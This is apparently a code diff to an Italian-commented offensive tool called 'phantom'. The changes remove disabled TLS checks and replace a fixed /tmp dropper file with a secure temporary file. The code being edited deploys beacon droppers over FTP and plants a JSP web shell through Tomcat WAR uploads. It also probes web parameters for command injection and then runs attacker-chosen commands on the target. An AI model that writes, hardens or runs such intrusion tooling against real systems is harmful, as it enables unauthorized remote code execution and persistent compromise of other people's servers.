@@ -453,7 +453,7 @@ def _verify_tomcat(target: str, port: int, username: str, password: str) -> bool
     try:
         import requests
         url = f"http://{target}:{port}/manager/text/list"
-        resp = requests.get(url, auth=(username, password), timeout=5, verify=False)
+        resp = requests.get(url, auth=(username, password), timeout=5)
         return resp.status_code == 200
     except ImportError:
         # Fallback: curl
@@ -825,13 +825,24 @@ def deploy_beacon_via_ftp(
             except Exception:
                 continue
 
-        # Crea il dropper come script shell
+        # Crea il dropper come script shell. mkstemp, not a fixed /tmp name:
+        # a predictable path lets another local user pre-create it (or a
+        # symlink at it) before the upload reads it.
+        import tempfile
         beacon_name = ".beacon.sh"
-        with open("/tmp/_phantom_beacon_dropper", "w") as f:
-            f.write(dropper)
-
-        with open("/tmp/_phantom_beacon_dropper", "rb") as f:
-            ftp.storbinary(f"STOR {beacon_name}", f)
+        fd, dropper_path = tempfile.mkstemp(prefix="phantom_beacon_",
+                                            suffix=".sh")
+        os.close(fd)
+        try:
+            with open(dropper_path, "w", encoding="utf-8") as f:
+                f.write(dropper)
+            with open(dropper_path, "rb") as f:
+                ftp.storbinary(f"STOR {beacon_name}", f)
+        finally:
+            try:
+                os.unlink(dropper_path)
+            except OSError:
+                pass
 
         ftp.quit()
 
@@ -894,7 +905,6 @@ Runtime.getRuntime().exec(new String[]{{"sh", "-c", "{escaped}"}});
                     files={"file": war_file},
                     params={"path": "/beacon"},
                     timeout=10,
-                    verify=False,
                 )
 
             if resp.status_code in (200, 201):
@@ -902,7 +912,7 @@ Runtime.getRuntime().exec(new String[]{{"sh", "-c", "{escaped}"}});
                 # the JSP actually executes the dropper on the target.
                 trigger_url = f"http://{target}:{port}/beacon/exec.jsp"
                 try:
-                    trigger = requests.get(trigger_url, timeout=15, verify=False)
+                    trigger = requests.get(trigger_url, timeout=15)
                     if trigger.status_code == 200:
                         notifier.success(f"Beacon deployed via Tomcat WAR to {target}")
                         return True, f"WAR deployed and JSP triggered ({trigger.status_code})"
@@ -1039,11 +1049,11 @@ def execute_http_rce(
         try:
             url = f"http://{target}:{port}{path}"
             # Test verification command
-            resp = requests.get(url, params={param: verify_cmd}, timeout=5, verify=False)
+            resp = requests.get(url, params={param: verify_cmd}, timeout=5)
             if resp.status_code == 200 and token in resp.text:
                 notifier.info(f"Vulnerable parameter found: '{param}' (GET)")
                 # Execute real command
-                requests.get(url, params={param: command}, timeout=5, verify=False)
+                requests.get(url, params={param: command}, timeout=5)
                 return True, f"Executed via GET parameter: {param}"
         except Exception:
             continue
@@ -1052,10 +1062,10 @@ def execute_http_rce(
     for param in params_to_try:
         try:
             url = f"http://{target}:{port}{path}"
-            resp = requests.post(url, data={param: verify_cmd}, timeout=5, verify=False)
+            resp = requests.post(url, data={param: verify_cmd}, timeout=5)
             if resp.status_code == 200 and token in resp.text:
                 notifier.info(f"Vulnerable parameter found: '{param}' (POST)")
-                requests.post(url, data={param: command}, timeout=5, verify=False)
+                requests.post(url, data={param: command}, timeout=5)
                 return True, f"Executed via POST parameter: {param}"
         except Exception:
             continue
